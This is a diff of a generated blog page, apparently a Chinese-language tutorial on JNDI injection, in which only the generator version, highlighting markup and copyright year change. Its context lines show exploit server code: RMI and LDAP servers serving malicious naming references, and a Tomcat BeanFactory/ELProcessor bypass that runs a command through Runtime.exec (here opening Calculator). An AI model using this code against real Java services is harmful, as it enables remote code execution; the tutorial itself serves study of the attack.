@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.105.0"><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.109.0"><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -548,7 +548,7 @@
 </span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;http://127.0.0.1:8080/&#34;</span><span class="o">;</span>
-</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">            <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="s">&#34;test&#34;</span><span class="o">,</span> <span class="n">url</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;obj&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
@@ -755,7 +755,7 @@
 </span></span><span class="line"><span class="cl">    <span class="c1">// 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">BIND_HOST</span> <span class="o">=</span> <span class="s">&#34;127.0.0.1&#34;</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// 设置LDAP服务端口
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="n">3890</span><span class="o">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="mi">3890</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
@@ -800,7 +800,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">entry</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;objectClass&#34;</span><span class="o">,</span> <span class="s">&#34;javaNamingReference&#34;</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">entry</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
 </span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
 </span></span><span class="line"><span class="cl">            <span class="o">}</span>
@@ -908,7 +908,7 @@
 </span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">server</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1098</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1098</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">            <span class="n">ResourceRef</span> <span class="n">resourceRef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ResourceRef</span><span class="o">(</span><span class="s">&#34;javax.el.ELProcessor&#34;</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="s">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">            <span class="n">resourceRef</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">&#34;forceString&#34;</span><span class="o">,</span> <span class="s">&#34;a=eval&#34;</span><span class="o">));</span>
 </span></span><span class="line"><span class="cl">            <span class="n">resourceRef</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">&#34;a&#34;</span><span class="o">,</span> <span class="s">&#34;Runtime.getRuntime().exec(\&#34;open /System/Applications/Calculator.app\&#34;)&#34;</span><span class="o">));</span>
@@ -1032,7 +1032,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LDAP_BASE</span> <span class="o">=</span> <span class="s">&#34;dc=example,dc=com&#34;</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span> <span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="n">1389</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">1389</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="n">LDAP_BASE</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span>
@@ -1079,7 +1079,7 @@
 </span></span><span class="line"><span class="cl">                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
 </span></span><span class="line"><span class="cl">            <span class="o">}</span>
 </span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
 </span></span><span class="line"><span class="cl">        <span class="o">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
@@ -1304,7 +1304,7 @@
     
 
 
-            <div class="site-info">©&nbsp;2022&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+            <div class="site-info">©&nbsp;2023&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
               </div>
 
             
